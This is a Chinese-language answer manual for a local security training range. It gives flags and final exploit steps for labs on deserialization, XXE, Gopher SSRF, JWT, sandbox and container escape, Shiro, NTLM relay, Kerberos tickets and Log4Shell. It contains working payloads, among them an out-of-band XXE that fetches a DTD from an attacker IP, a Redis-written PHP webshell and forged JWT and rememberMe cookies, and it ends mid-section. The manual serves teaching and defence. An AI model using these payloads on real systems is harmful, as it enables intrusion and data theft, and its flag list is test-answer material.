# 答案手册

> **先自己做，卡住两小时以上再看。**
> 这份文档只解决「过不去」，不解决「学不会」——每关的原理在各自靶场的
> `README.md` 和页面里的提示中都有，答案里只补最后一步。

靶场按难度大致排：DVWA（基础）→ JWT / XXE（Web 常规漏洞）→
反序列化 / Gopher（进阶）→ webshell-hunt（应急响应）→ 沙箱逃逸（进阶）→
Shiro（多版本对照）→ ARP（网络层）→ Replay / AD CS（域内协议链）→
Kerberos（黄金 / 白银票据）→ Log4Shell（组件漏洞）。Java 内存马不是漏洞，
没有 flag，验证方式在它自己的章节里。

---

## 一、flag 总表

| 靶场 | 关卡 | flag | 读的是哪个文件 |
|---|---|---|---|
| 反序列化 | PHP L1 / L2 / L3 | `FLAG{php_deser_unserialize_pwned_8a3f}` | PHP 8.1 容器 `/flag` |
| 反序列化 | PHP L4（phar） | `FLAG{php_deser_phar_6c2e}` | PHP 7.4 容器 `/flag` |
| 反序列化 | Java CC6 | `FLAG{java_deser_cc6_9f1c}` | Java 容器 `/flag` |
| XXE | L1 / L3 / L5 | `FLAG{xxe_file_read_3f7a}` | web 容器 `/flag` |
| XXE | L2（盲打） | `FLAG_xxe_blind_oob_5b2e` | web 容器 `/flag_blind` |
| XXE | L4（SSRF） | `FLAG{xxe_ssrf_internal_9c1d}` | internal 容器 `/flag` |
| Gopher | L1 | `flag{g0ph3r_pr0t0c0l_1s_just_tcp}` | legacy-public 的 `l1.txt` |
| Gopher | L2 | `flag{r3d1r3ct_ch4ng3s_th3_sch3m3}` | legacy-internal 的 `l2.txt` |
| Gopher | L3 | `flag{r3d1s_un4uth_r3ad_4ll_k3ys}` | Redis key `l3_flag` |
| Gopher | L4 | `flag{r3d1s_wr1t3s_y0ur_w3bsh3ll}` | web 容器 `/flag_l4` |
| Gopher | L5 | `flag{my5ql_h4ndsh4k3_by_h4nd}` | MySQL `secret.flag` 表 |
| Gopher | L6 | `flag{f4stcg1_9000_n0_auth}` | fpm 容器 `/flag_l6` |
| JWT | L1 | `FLAG{jwt_l1_secret_was_just_secret}` | `/flag_l1` |
| JWT | L2 | `FLAG{jwt_l2_alg_none_bypass}` | `/flag_l2` |
| JWT | L3 | `FLAG{jwt_l3_rs256_to_hs256_confusion}` | `/flag_l3` |
| JWT | L4 | `FLAG{jwt_l4_kid_path_traversal}` | `/flag_l4` |
| 沙箱逃逸 | L1（Node vm） | `FLAG{sandbox_escape_node_vm_1a2b}` | sbox-web `/flag_l1` |
| 沙箱逃逸 | L2（Python 黑名单） | `FLAG{sandbox_escape_py_blacklist_3c4d}` | sbox-web `/flag_l2` |
| 沙箱逃逸 | L3（pickle 白名单） | `FLAG{sandbox_escape_pickle_attr_5e6f}` | sbox-web `/flag_l3` |
| 沙箱逃逸 | L4（chroot） | `FLAG{sandbox_escape_chroot_fd_7a8b}` | sbox-web `/flag_l4`（jail 外） |
| 沙箱逃逸 | L5（docker.sock） | `FLAG{sandbox_escape_docker_sock_9c0d}` | sbox-vault `/flag_l5` |
| 沙箱逃逸 | L6（privileged） | `FLAG{sandbox_escape_privileged_host_1e2f}` | 宿主 `/lab-escape/l6.flag` |
| Shiro | 550（1.2.4 默认密钥） | `FLAG{shiro550_default_key_rememberme_4b71}` | shiro-550 `/flag` |
| Shiro | 721（padding oracle） | `FLAG{shiro721_padding_oracle_root_9c2e}` | shiro-721 `/flag` |
| Shiro | 路径绕过（任一版本） | `FLAG{shiro_path_bypass_semicolon_a83d}` | shiro-bypass `/flag` |
| Replay / AD CS | L1 无防重放 | `FLAG{replay_l1_no_nonce_no_timestamp_at_all}` | replay-adcs `/flags/l1.flag` |
| Replay / AD CS | L2 假 nonce | `FLAG{replay_l2_nonce_not_covered_by_signature}` | replay-adcs `/flags/l2.flag` |
| Replay / AD CS | L3 NTLMv2 | `FLAG{ntlmv2_challenge_response_handcrafted}` | replay-adcs `/flags/l3.flag` |
| Replay / AD CS | L4 ESC8 中继 | `FLAG{esc8_ntlm_relay_dc_to_certsrv}` | replay-adcs `/flags/l4.flag` |
| Replay / AD CS | L5 ESC1 + PKINIT | `FLAG{esc1_san_upn_pkinit_domain_admin}` | replay-adcs `/flags/l5.flag` |
| Kerberos | L1 正常 AS/TGS/AP | `FLAG{kerberos_l1_as_tgs_ap}` | kerberos `/flags/l1.flag` |
| Kerberos | L2 黄金票据 TGT | `FLAG{kerberos_l2_golden_tgt}` | kerberos `/flags/l2.flag` |
| Kerberos | L3 白银票据 TGS | `FLAG{kerberos_l3_silver_tgs}` | kerberos `/flags/l3.flag` |
| Kerberos | L4 SPN 作用域 | `FLAG{kerberos_l4_spn_scope}` | kerberos `/flags/l4.flag` |
| Kerberos | L5 PAC 签名 | `FLAG{kerberos_l5_pac_signature}` | kerberos `/flags/l5.flag` |
| Kerberos | L6 krbtgt 轮换 | `FLAG{kerberos_l6_krbtgt_rotation}` | kerberos `/flags/l6.flag` |
| Log4Shell | L1 `${env:}` 外带 | `FLAG{log4shell_env_lookup_oob_7d2a}` | log4shell `/flags/l1.flag` |
| Log4Shell | L2 远程 codebase RCE | `FLAG{log4shell_jndi_codebase_rce_b41e}` | log4shell `/flags/l2.flag` |
| Log4Shell | L3 关键字绕过 | `FLAG{log4shell_lookup_obfuscation_9c73}` | log4shell `/flags/l3.flag` |

DVWA、webshell-hunt、ARP、Java 内存马没有 flag：
DVWA 是 18 个模块的练习场，webshell-hunt 的目标是「找齐 9 处后门」，
ARP 是网络实验，Java 内存马是驻留机制的运行时验证。评价标准都在各自 README 里。

---

## 二、反序列化

三个入口：`8890`（PHP 8.1，L1~L3）、`8891`（PHP 7.4，L4）、`8892`（Java）。

### PHP L1 —— 魔术方法

`Cache` 类在 `__destruct` 里对 `$cmd` 调了 `system()`。序列化时把 `cmd`
改成 `cat /flag` 即可：

```php
O:5:"Cache":2:{s:3:"cmd";s:9:"cat /flag";s:4:"path";s:9:"/tmp/cache";}
```

**关键**：属性个数必须和真实属性数一致。写 `O:5:"Cache":99:{...}` 想绕过
`__wakeup`（CVE-2016-7124）在 PHP 8.1 上直接让 `unserialize()` 返回 `false`，
对象根本不创建。

### PHP L2 —— POP 链

没有哪个类单独能读 flag，要按「谁调用了谁」把三个类串起来：
入口类的 `__destruct` 调 `__toString`，`__toString` 再拼出危险调用。
顺着 `php/src/inc/classes.php` 里每个魔术方法的实现往回推，链条只有一条。

### PHP L3 —— private 属性

`private` 属性在序列化串里的名字是 `\0类名\0属性名`，**长度按字节算**：

```
\0Gate\0cmd    →  9 字节（1 + 4 + 1 + 3）
```

写成 `\0Gate\0cmd` 但长度标 8 会直接反序列化失败。另外注意
`system()` 被换成了 `echo blocked`，得让它执行真正的命令。

### PHP L4 —— phar（只有 7.4 能触发）

三步：

1. 用容器里的 `poc/gen_phar.php` 生成恶意 phar，改名成 `.jpg` 上传
2. 触发点是文件操作函数碰到 `phar://` 路径。PHP 7.4 下
   `file_exists` / `is_file` / `filesize` / `md5_file` 都会触发元数据反序列化
3. 元数据里的 `Thumb` 对象在解析时执行 `__destruct`，把 `/flag` 复制到
   `uploads/`，然后直接访问那个文件

**PHP 8.1 上这套无效**——元数据改成了惰性反序列化，必须显式
`new Phar()->getMetadata()` 才会触发。这就是 L4 单独跑 7.4 的原因。

### Java CC6

```bash
cd deserialization && python3 poc/java_exp.py
```

链路从 `HashMap.readObject` → `hashCode` 进，不碰 JDK 8u71 修掉的那个
`AnnotationInvocationHandler`，所以高版本 JDK 也能打。构造时要注意两个坑：

- 先用假的 `ChainedTransformer`，否则 `map.put()` 那一刻命令就在本地执行了
- 必须 `lazyMap.remove(key)`，不然反序列化时命中缓存，链子不触发

---

## 三、XXE

五个关卡在 `8895`，一页一关。全部 payload 在 `xxe/poc/xxe_exp.py` 里，
下面只讲关键点。

### L1 —— 有回显

```xml
<!DOCTYPE order [
  <!ENTITY xxe SYSTEM "file:///flag">
]>
<order><item>&xxe;</item></order>
```

**坑**：`(string)$simplexml` 只取根节点的直属文本，
`<order><item>flag</item></order>` 强转会得到空串，必须遍历子节点。

### L2 —— 盲打外带

页面不回显，得让解析器把数据当 URL 发出来：

```xml
<!DOCTYPE r [
  <!ENTITY % remote SYSTEM "http://<你的IP>:<端口>/evil.dtd">
  %remote;
  %exfil;
]>
```

`evil.dtd` 里用参数实体把文件内容拼进 `SYSTEM` 的 URL。

**两个必须知道的坑**：

- `/flag_blind` 是特意做成不带 `{}`、不带换行的 token。因为 libxml 会校验
  外带 URL，`{` `}` 和裸 `\n` 都是非法 URI 字符，请求根本发不出去
- 接收端必须回**空响应体**。回 `ok` 会被当成实体内容继续解析，直接报
  `error detected in Markup declaration`

现成的接收端：`python3 xxe/poc/oob_server.py`（自带恶意 DTD 和 `/collect`）。
用 `xxe_exp.py` 的话它会自己起临时服务器，不用另开窗口。

### L3 —— 报错型（不出网）

```xml
<!DOCTYPE r [
  <!ENTITY % remote SYSTEM "file:///usr/share/xml/xxe-lab.dtd">
  %remote;
  %error;
]>
```

利用 libxml 把「未定义实体」的报错内容打到页面上。

**规范限制**：报错 payload **不能写在内部子集里**。XML 规范禁止内部子集的
实体声明值里出现参数实体引用，libxml 会直接报
`PEReferences forbidden in internal subset in Entity`。所以必须落到外部 DTD
（本地 `file://` 或远程 `http://`）。

### L4 —— SSRF 打内网

数据源导入功能会去拉远程 XML。协议白名单只挡了 URL 本身，没挡 XML 里的实体：

```xml
<!DOCTYPE r [<!ENTITY ssrf SYSTEM "http://internal/admin.php">]>
<r>&ssrf;</r>
```

`internal` 容器不映射端口，宿主机 `curl http://internal` 直接 DNS 失败——
这是真隔离。但 web 容器能解析它，于是由 web 代你去请求。

**顺带一提**：`internal/admin.php` 里的来源 IP 白名单形同虚设，
因为请求天然来自内网地址，检查直接通过。

### L5 —— 上传 SVG

SVG 本身就是 XML，上传点就是 XXE 入口：

```xml
<svg xmlns="http://www.w3.org/2000/svg">
  <!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///flag">]>
  <text x="10" y="20">&xxe;</text>
</svg>
```

### 修复对照

`safe.php` 把同一份 payload 喂给安全写法，实体不展开、页面只剩字面量。
四档修法从弱到强：拒绝 DOCTYPE → 不传 `LIBXML_NOENT` → 加 `LIBXML_NONET`
→ 换解析方式。只做 `LIBXML_NONET` 是自我安慰，`file://` 照样能读。

---

## 四、Gopher

六关在 `8896`。所有后端服务都在容器内网，宿主机连不到，必须借 web 的手。
参考脚本在 `gopher/poc/`，按 01→06 顺序。

### L1 —— 协议本体

```bash
curl -v 'gopher://127.0.0.1:7070/0/l1.txt'
```

selector 就一行，行尾 CRLF。菜单行（type `1`）是五个 TAB 分隔的字段。

### L2 —— 302 换协议

白名单只检查字符串前缀：

```
url 必须以 http://legacy-internal:8081/ 开头
```

网关自己有 `/r?to=<url>` 的 302 跳转，而 curl 跟随时不校验新协议
（靶场特意放开了 `CURLOPT_REDIR_PROTOCOLS` 模拟老版本 libcurl）：

```bash
curl 'http://legacy-internal:8081/r?to=gopher%3A%2F%2Flegacy-internal%3A70%2F0%2Fl2.txt'
```

`to` 参数里的 `:` `/` 会被 URL 解析吃掉，整段值要 URL 编码一次。

### L3 —— 打 Redis 读

黑名单挡了 `file://` `dict://`，漏了 `gopher://`。RESP 数组格式：

```
*2\r\n$3\r\nGET\r\n$7\r\nl3_flag\r\n*1\r\n$4\r\nQUIT\r\n
```

**两个坑**：

- `$<len>` 必须是 key 的真实字节数。`l3_flag` 是 **7** 字节，写成 `$8`
  会把结尾的 `\r` 吃进 key 里，`GET` 永远返回 nil，而且不报错
- 末尾补 `QUIT`。Redis 默认不主动关连接，不补的话 curl 等到超时返回
  `false`，已经收到的数据全丢

### L4 —— 打 Redis 写

```
CONFIG SET dir /var/www/html/uploads
CONFIG SET dbfilename shell.php
SET payload "<?php system($_GET[0]); ?>"
SAVE
```

`SAVE` 把内存快照写成 `uploads/shell.php`。RDB 前面有一堆二进制垃圾，
但 PHP 只在 `<?php` 之后开始解析，不影响执行。

访问：`http://127.0.0.1:8896/uploads/shell.php?0=cat%20/flag_l4`

**验证时的坑**：响应体前面是整段 RDB 快照，里面带着 L3 灌进去的
`l3_flag` 明文。如果用正则取**第一个** `flag{...}`，拿到的是 L3 的 flag，
看起来像「打穿了但 flag 不对」。`system()` 的输出在响应末尾，**取最后一个**才是 L4 的。

**前提**：Redis 7 默认禁止 `CONFIG SET dir/dbfilename`，
靶场用 `--enable-protected-configs yes` 打开。老版本（≤6.2）没这道闸。

### L5 —— 手拼 MySQL 握手

gopher 只能发不能收，所以必须一条 payload 完成「握手 + 查询」：

1. 手工构造 `HandshakeResponse41`（能力标志 + 用户名 + 认证响应 + 库名）
2. 紧跟一条 `COM_QUERY`，包序号从 1 开始

靶场里的免密账号是 `ssrf`，所以省掉了 `SHA1(pass) XOR SHA1(salt + ...)`
的计算——salt 每次随机，gopher 拿不到，有密码这关就是死路。

查询：`SELECT val FROM flag WHERE id=1`

### L6 —— 打 PHP-FPM

关键在 FastCGI 记录格式和 name-value 对的编码：

```
nameLen(1) + valueLen(1) + name + value
```

不是「名字长度 + 名字 + 值长度 + 值」。拼错的话 fpm 直接把连接 RST 掉，
页面只显示空响应，日志里干干净净。

用 `PHP_VALUE` 把 `auto_prepend_file` 指向 `data://` 或已落地的 webshell：

```
PHP_VALUE: allow_url_include=On
PHP_VALUE: auto_prepend_file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgL2ZsYWdfbDYnKTs/Pg==
```

`PARAMS` 和 `STDIN` 结束时都要各补一条**空内容**的同类型记录，否则 fpm
会一直等。

**curl 的坑**：libcurl 的 gopher 实现走 C 字符串，payload 里的 `%00` 会截断。
MySQL 的长度字段和 FastCGI 的 contentLength 几乎必然带 NUL，
所以 L5/L6 的接口改用 `stream_socket_client` 直发。

---

## 五、JWT

四关在 `8898`，唯一能登录的账号是 `alice / alice123`（普通用户）。
共同目标：造一个 `role=admin` 的令牌，读走对应 flag。

### L1 —— 弱密钥

`const SECRET = 'secret'`。拿字典里的词逐个算 HMAC-SHA256，和签名段比对：

```bash
cd jwt && python3 poc/jwt_exp.py 1
```

字典内嵌在脚本里，不用装 hashcat。这一关考的不是 JWT，是 HMAC 密钥强度。

### L2 —— alg:none

服务端从令牌里读 `alg`，等于 `none` 就跳过验签。改 header、把签名段清空：

```
{"alg":"none","typ":"JWT"} . {"user":"alice","role":"admin"} .
```

注意最后那个点要留着（空签名），不是删掉。

### L3 —— 算法混淆

RS256 用私钥签、公钥验。但 HS256 分支把**公开的公钥文本**当 HMAC 密钥：

```php
$ok = hash_equals(sign_hs256($input, $pub), $s);
```

公钥就挂在页面上让人下载。于是改用 HS256、拿 `pub.pem` 的完整文本当密钥
自己签一个，服务端会认。

### L4 —— kid 路径穿越

```php
$keyfile = __DIR__ . '/keys/' . $kid;
```

`__DIR__` 在容器里是 `/var/www/html`，所以：

```
kid = ../../../../dev/null
```

规范化后就是 `/dev/null`：一定存在、一定可读、内容为空。
空字符串恰好是 `hash_hmac` 能接受的密钥，于是用空密钥签 HS256 即可。

选 `/dev/null` 而不是 `/etc/passwd`，是因为后者的内容当 HMAC 密钥也能用，
但长度不定、不好复现。

### 修复对照

`safe.php` 把 L1~L4 造出来的令牌粘进去，会看到四条各自被怎么挡掉。

---

## 六、webshell-hunt

目标不是拿 flag，是在容器里找出 **9 处后门 + 1 处诱饵**，且不误报。

```bash
docker exec -it webshell-hunt bash
cd /var/www/html && ls -la
```

### 9 处后门

按「发现它需要什么能力」分层：

**L1 · grep 关键词就能命中**

1. `wp-includes/simple.php` — 明文一句话 `eval($_POST['pass'])`

**L2 · 得读上下文才知道是不是后门**

2. `wp-content/themes/twentytwenty/functions.php:172` —
   注释写着「多语言缓存」，实际 `eval(base64_decode($_COOKIE[...]))`
3. `upgrade.php:36` — 函数名拆成 `'sys' . 'tem'`，再 `$fn($arg)`，
   纯关键词扫描抓不到

**L3 · 靠文件系统元数据，不看内容**

4. `wp-content/plugins/cache/.wp-check.php` — 三重伪装：点开头隐藏、
   mtime 改到 2024、权限 600（全站唯一一个非 644 的 php）
5. `wp-content/uploads/2026/03/.htaccess:8` —
   `AddType application/x-httpd-php .jpg`，把图片变成可执行脚本
6. `wp-content/uploads/2026/03/index.php.bak` — 备份文件里留着后门源码

**L4 · 编码 / 混淆，必须解码才能判断**

7. `wp-content/uploads/2026/03/logo.jpg` — 合法 JPEG 尾部追加 PHP
8. `wp-content/mu-plugins/loader.php` — gzinflate + base64 分段拼接，
   解压后写临时文件再 include
9. `/var/tmp/sess_a3f9c2e1b7d4` — session 投毒，**不在 web 目录里**，
   等着被 LFI 包含

### 唯一的诱饵

`wp-admin/admin-ajax.php:24` — `call_user_func( $handlers[ $action ] )`，
但 `$action` 被 `$handlers` 白名单限制，属于正常分发逻辑。**报它就是误报。**

### 自动对照

```bash
python3 webshell-hunt/hunt.py --docker webshell-hunt
```

13 条规则过一遍，按 HIGH/MED/LOW 分级，每条带文件、行号、证据、判定理由。
正常结果：`命中文件 9 / 25，HIGH 9 项`。

它只负责少漏，定案还是要读代码——所以上面每条都写了判定依据。

### 完整排查顺序

`webshell-hunt/answer/ANSWERS.md` 第三节有七步法：时间线 → 关键词 →
元数据 → 非 php 文件 → 日志 → www 之外 → 交叉验证。答案里额外给了
清理与加固清单（留证、断执行入口、换密钥、修入口漏洞）。

---

## 七、ARP

七个实验在 `arp/README.md` 里，没有 flag，按顺序做：

1. 先看正常状态（路由、ARP 缓存、能连通）——这是所有对比的基线
2. 为什么 `arpspoof` 跑了却没反应（第一个大坑）
3. 单向毒化只能看到上行流量
4. 双向毒化 + 开转发 = 完整中间人，抓明文密码
5. 检测：怎么发现自己在被投毒
6. 静态 ARP 绑定（防御）
7. 换现成工具复现

启动（需要 profile）：

```bash
./lab.sh up all
docker exec -it arp-victim ip neigh      # 看缓存有没有被改
docker exec arp-gw cat /sys/class/net/eth0/address   # 真实 MAC，别抄死值
```

**每个容器的 MAC 在重建后都会变**，所有命令都从容器里现读。

协议原理（报文结构、缓存状态机、脚本逐层拆解）在 `arp/PRINCIPLE.md`。

---

## 八、Sandbox Escape（沙箱逃逸）

入口 `8900`（L1~L4 页面），L5 / L6 在容器里。
六关的完整解读见 `sandbox-escape/answer/ANSWERS.md`，这里只给最后一步。

### L1 —— Node.js `vm`

沙箱里的对象属于宿主 Realm，`constructor.constructor` 就是宿主的 `Function`：

```js
this.constructor.constructor('return process')()
    .mainModule.require('fs').readFileSync('/flag_l1', 'utf8')
```

### L2 —— Python 关键字黑名单

黑名单拦的是字面量，`__class__` 拼出来就行；`getattr` 没被拉黑，正好能把
拼出来的名字当属性名：

```python
t = getattr((), '_' + '_class_' + '_')
o = getattr(t, '_' + '_ba' + 'ses_' + '_')[0]
for k in getattr(o, '_' + '_sub' + 'classes_' + '_')():
    i = getattr(k, '_' + '_in' + 'it_' + '_', None)
    g = getattr(i, '_' + '_glo' + 'bals_' + '_', None)
    if isinstance(g, dict) and 'system' in g:
        g['system']('cat /flag_l2'); break
```

### L3 —— pickle 模块白名单

白名单只看 `module`，`name` 是限定名，点号会被 `_getattribute()` 展开。
`models.py` 顶部 `import subprocess`，所以：

```python
import base64
def su(s):
    b = s.encode(); return b"\x8c" + bytes([len(b)]) + b
payload = (b"\x80\x04" + su("models") + su("subprocess.getoutput")
           + b"\x93" + su("cat /flag_l3") + b"\x85" + b"R.")
print(base64.b64encode(payload).decode())
```

### L4 —— chroot

父进程在 chroot 前打开了 `/` 并 `dup2` 成 fd 3。`chroot` 不回收 fd：

```python
os.fchdir(3); os.chroot("."); os.chdir("/")
print(open("/flag_l4").read())
```

### L5 —— Docker Socket

```bash
docker exec -it sbox-sock bash
docker exec sbox-vault cat /flag_l5
```

纯 API 的走法（`exec` 是"创建 + 启动"两段）：

```bash
curl --unix-socket /var/run/docker.sock -s -H 'Content-Type: application/json' \
     -d '{"AttachStdout":true,"Cmd":["cat","/flag_l5"]}' \
     http://localhost/containers/sbox-vault/exec
curl --unix-socket /var/run/docker.sock -s -H 'Content-Type: application/json' \
     -d '{"Detach":false,"Tty":true}' http://localhost/exec/<ExecId>/start
```

### L6 —— privileged + hostPID

```bash
docker exec -it sbox-priv bash
cat /proc/1/root/lab-escape/l6.flag
```

`--pid=host` 让 `/proc` 里出现宿主的进程表，`--privileged` 给了穿过
`/proc/<pid>/root` 的 capability —— 宿主根目录就到手了。
macOS / Windows 上"宿主"是 Docker Desktop 的 Linux VM。

---

## 九、Shiro（三个入口，六个版本）

三个入口共用同一个镜像，靠 `--lab.mode` 切换行为。原理见 `shiro/README.md`，
这里只写「怎么最快拿到 flag」。

### 9.1 Shiro-550：默认密钥（:8901）

```bash
python3 shiro/poc/shiro550_exp.py
```

要点：

- 1.2.4 的 rememberMe 密钥是常量 `kPH+bIxk5D2deZiIxcaaaA==`
- 先发一个坏 cookie 看服务端回不回 `rememberMe=deleteMe`，确认是 Shiro
- 拿 `/payloads/cc6.bin`（CC6 序列化字节），用每个候选 key 加密后发出去
- 命令是 `cat /flag > /tmp/out/flag.txt`，再从 `/out/flag.txt` 把结果取回来
- 命中在第 6 个 key，不是第一个

手工版（想自己拼 cookie 的话）：

```bash
KEY=$(printf '%s' 'kPH+bIxk5D2deZiIxcaaaA==' | base64 -d | xxd -p -c 32)
IV=$(openssl rand -hex 16)
openssl enc -aes-128-cbc -K "$KEY" -iv "$IV" -in /tmp/cc6.bin -out /tmp/ct.bin
(printf '%s' "$IV" | xxd -r -p; cat /tmp/ct.bin) | base64 | tr -d '\n' > /tmp/ck
curl -H "Cookie: rememberMe=$(cat /tmp/ck)" http://127.0.0.1:8901/
curl http://127.0.0.1:8901/out/flag.txt
```

### 9.2 Shiro-721：padding oracle（:8902）

```bash
python3 shiro/poc/shiro721_exp.py              # 默认串行，约 1 分钟（实测 50 秒左右）
python3 shiro/poc/shiro721_exp.py --workers 4  # 想快点可以调，但可能误判
```

要点：

- 1.2.5 起密钥随机，550 的套路失效；但 CBC 没有完整性校验
- 先用 `guest/guest123` 正常登录拿一个合法 cookie（416 字节 = IV + 25 块）
- 用 `/__oracle` 当裁判：204 = 填充合法，400 = 填充非法
- **每次只发两块密文**，让目标块变成"最后一块"，填充校验才对得准
- **每造一块新密文，都要重新爆破一次它的中间值**——不能拿原 cookie 的
  `D(Ci)` 去套新块，解出来是乱码（我就在这儿卡了很久，`/admin` 一路 302）
- payload 362 字节 → 23 块，串行约 51 秒

flag 在 `/admin` 页面上，需要伪造出 `root` 身份才能看到。

不用 oracle 的验证路径（调试用）：

```bash
# 起容器时加 --lab.debug=true，日志里会打出这次随机生成的 AES key
docker run --rm -e JAVA_TOOL_OPTIONS= sec-lab/shiro:1.0 \
  java -jar /app/shiro-1.2.5.jar --lab.mode=721 --lab.debug=true
```

拿这个 key 直接加密 `principal_root.bin`，一样能进 `/admin` —— 说明
"伪造身份"这件事本身不需要 oracle，oracle 解决的是"不知道 key 时怎么伪造"。

### 9.3 路径绕过：四个版本对照（:8903~8906）

```bash
python3 shiro/poc/bypass_exp.py
```

四个端口对应 1.4.2 / 1.5.2 / 1.6.0 / 1.7.1，同一批 payload 打过去：

| payload | 1.4.2 | 1.5.2 | 1.6.0 | 1.7.1 |
|---|---|---|---|---|
| `/admin`（基线） | 302 | 302 | 302 | 302 |
| `/;/admin` | **BYPASS** | 302 | 400 | 400 |
| `/xxx/..;/admin` | 404 | 302 | 400 | 400 |
| `/admin/%3b` | 302 | 302 | 400 | 400 |
| `/admin/%20` | 302 | 302 | 302 | 302 |

怎么读这张表：

- **BYPASS**：Shiro 没匹配到 `/admin/**`，Spring 却把它路由到了 `/admin`，flag 到手
- **302**：被 `authc` 拦住，跳 `/login`
- **400**：1.6.0 起加了 `InvalidRequestFilter`，含分号 / 编码分号的 URL 直接被拒
- **404**：Shiro 放行了（不是 302），但 Spring 没把这条路径映射到 controller

`/xxx/..;/admin` 在 1.4.2 上是 404 而不是 302，这一点值得注意：
**鉴权已经绕过了**，只是这个靶场的路由没接住。真实系统里换个路由、
或者把路径换成 `/xxx/..;/admin/list` 之类的具体接口，往往就能打进去。

想加自己的 payload，改 `shiro/poc/bypass_exp.py` 里的 `PAYLOADS` 列表。

---

## 十、Replay / AD CS（8910）

五关一条链，`python3 replay-adcs/poc/exp.py` 一键跑完。卡住时看下面每一步的落点。

**L1** — `GET /bank/sample?level=1` 拿一条已经签好名的合法报文，原样
`POST /bank/l1/transfer` 五次。签名是 `HMAC-MD5(from|to|amount)`，不用破解：
重放攻击从来不需要知道密钥。

**L2** — 服务端加了 nonce 去重和 300 秒时间窗，但签名仍是上面那个式子，
`nonce` / `ts` 都没进签名。每次换一个新 `nonce`、刷新 `ts`，`sig` 原封不动，
五次打 `POST /bank/l2/transfer`。原样重放会被 409 挡住，正好证明去重是真的生效了。

**L3** — `LAB\alice / Passw0rd!`。
`type1 = ntlm.build_type1("LAB","CLIENT")` → POST `/ntlm/l3/type1` 拿 Type2；
`type3 = ntlm.make_type3_from_type2(ntlm.nt_hash("Passw0rd!"), "alice", "LAB", type2)`；
POST `/ntlm/l3/type3` 带 `sid` + `type3`。challenge 用后即删，别想着重放 Type3。

**L4** — 四步纯搬运，脚本里没有密码也没有 NT hash：
`POST /victim/negotiate` 拿 Type1 → 放进 `Authorization: NTLM <b64>` POST
`/certsrv/certfnsh.asp` 换 401 的 Type2（顺手收 `X-NTLM-Challenge` 头）→
`POST /victim/authenticate` 带 `vid` + `type2` 换 Type3 →
把 Type3 放进 `Authorization`、带上 `X-NTLM-Challenge` 再 POST 一次 certsrv。
CA 认证成 `LAB\DC$`，出 flag。

**L5** — 带 `X-CA-Session` POST `/certsrv/certfnsh.asp`：
`{"template":"VulnWebServer","subject":"CN=dc$","san":"upn=administrator@lab.local"}`。
拿 `cert` POST `/kdc/asktgt` 换 TGT，再带 `X-TGT` GET `/admin`。
同样的证书打 `/kdc/safe/asktgt` 会 403（KB5014754 强证书映射），这是修复对照。

flag 见总表。实现边界（哪些是真协议、哪些是 HMAC 替身）和真机对应工具链
写在 `replay-adcs/README.md`，页面 `/safe/check` 里前五项是实测、后两项是清单。

---

## 十一、Java 内存马（19090，独立启动）

**没有 flag**——这是驻留机制验证，答案就是「注册表前后差了一个 Filter，
且磁盘上找不到它」。先起环境：`./java-memshell/up.sh`（需要宿主 `javac`），
再跑 `python3 java-memshell/poc/run.py` 看 L0~L4。

**L0 基线** — `GET /__lab/scan`，记下 4 个 Filter 的 `codeSource`，全是 jar 路径。

**L1 标准 API 被拒** — 直接调 `addFilter` 会抛 `IllegalStateException`；
`javap` 确认 Tomcat 9 要求 `getState() == STARTING_PREP`，运行期已经过了这个阶段。

**L2 注入** — 通过模拟 RCE 入口把 base64 编码的 `EvilFilter.class` 送进去，
反射拿到 `StandardContext` 后走动态注册。`addFilterMapBefore` **不保证插到链首**
（反编译 `ContextFilterMaps.insertPoint` 可见）；实测新映射排在第 4/5 位——
这是手册里带错误结论原文的那条认知纠错。

**L3 命中与放行** — 带 `X-Lab-Probe` 的请求被 Filter 截获回显，不带则原样放行；
连 404 路径也会被截获，因为 Filter 在 Servlet 之前。

**L4 运行时检测** — 容器里 `find / -name '*Evil*'` 什么都没有（`classes` 只读挂载、
攻击者侧 `.class` 根本不进容器），但 `jcmd 1 GC.class_histogram | grep evil` 能看到
`evil.EvilFilter`，`/__lab/scan` 里它的 `codeSource=null`。

**L5 重启清零** — `docker restart memshell-lab` 后再扫，注入的 Filter 消失，回到 L0 基线。
完整命令、逐段原理与 6 条错误结论反证在 `java-memshell/Java内存马-练习手册.md`。

---

## 十二、Kerberos 黄金 / 白银票据（8907，独立启动）

先 `cd kerberos && sh setup.sh`，然后 `python3 poc/lab.py help` 看全部命令。
`python3 poc/solve.py` 一键跑完六关并断言；想自己练就按下面逐关来。
已知凭据 `alice / alice123`，票据每次指纹 / 时间戳会变，`ok` / flag / 日志条数不变。

**L1 正常三段流程** — `login alice alice123` → `ask http/portal.lab.local` →
`use http/portal.lab.local` → `logs`。DC 日志新增 4768（TGT 签发）+ 4769（TGS 签发），
成员机新增 4624。

**L2 黄金票据** — `leak krbtgt`（模拟 DCSync）→ `forge golden` → `klist` →
`ask cifs/dc.lab.local` → `use`。全程不发 HTTP 给 KDC 的 AS，TGT 是本地用
`krbtgt` 密钥封印的；能过是因为 KDC 信任自己签过的东西。`FLAG{kerberos_l2_golden_tgt}`。

**L3 白银票据** — `leak service cifs/files.lab.local`（模拟目标机提权读机器账户）
→ `forge silver --spn cifs/files.lab.local` → `use`。**关键证据：DC 的 4769 一行不增**，
票据只给目标服务自己验。`FLAG{kerberos_l3_silver_tgs}`。

**L4 SPN 作用域** — 直接 `use http/files.lab.local`：同一台机器上的不同 SPN
用的是不同服务密钥，跨 SPN 用不了，被拒。

**L5 完整 PAC 签名** — `pac on` 后重放白银票据得到 `bad_kdc_signature`（服务端验出了
PAC 里 KDC 签名不对）；黄金票据仍然成功，因为 krbtgt 签的 PAC 本来就合法。
通关后 `klist` 能直接看到：TGT 的 PAC 两个签名相同，TGS 的两个不同——
一个用 krbtgt + 服务密钥分别签。

**L6 krbtgt 轮换** — 存好旧黄金 TGT，`reset`（轮换 krbtgt）后 `ask` 仍成功
（票据还在有效期内、签名用的是旧密钥的历史条目）；再 `reset` 一次就 `tgt_invalid`。
flag 见总表；每关的命令 / 原理 / 实测输出逐段写在 `kerberos/README.md`。

---

## 十三、Log4Shell（19080~19082，独立启动）

先 `./log4shell/up.sh`。payload 打在 User-Agent，`Main.java` 把它 `LOG.info()` 进日志，
log4j-core 2.14.1 的 `StrSubstitutor` 自己完成解析——漏洞不在业务代码里。

**L1 环境变量外带** — `python3 log4shell/poc/01_probe.py`：
